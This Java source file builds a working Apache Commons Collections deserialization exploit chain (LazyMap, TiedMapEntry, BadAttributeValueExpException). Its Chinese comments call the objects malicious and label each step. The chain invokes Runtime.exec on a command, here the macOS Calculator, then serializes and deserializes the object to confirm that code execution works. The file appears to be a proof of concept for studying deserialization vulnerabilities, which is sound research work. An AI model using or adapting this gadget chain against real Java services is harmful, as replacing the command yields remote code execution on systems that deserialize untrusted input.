import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class Test5 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        System.out.println(System.getProperty("java.version"));

        //  第一步 构造恶意 lazyMap
        String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<String,String> hashMap = new HashMap<>();
        hashMap.put("testKey","testVal");
        Map evilMap = LazyMap.decorate(hashMap,chainedTransformer);

        // 第二步 构造恶意的 TiedMapEntry
        TiedMapEntry tiedMapEntry = new TiedMapEntry(evilMap, "9eek");

        // 第三步 构造 BadAttributeValueExpException
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("test");
        ReflectUtils.setFields(badAttributeValueExpException,"val",tiedMapEntry);

        // 第四步 反序列化验证
        String path =  ExpUtils.serialize(badAttributeValueExpException);
        ExpUtils.unserialize(path);


    }
}
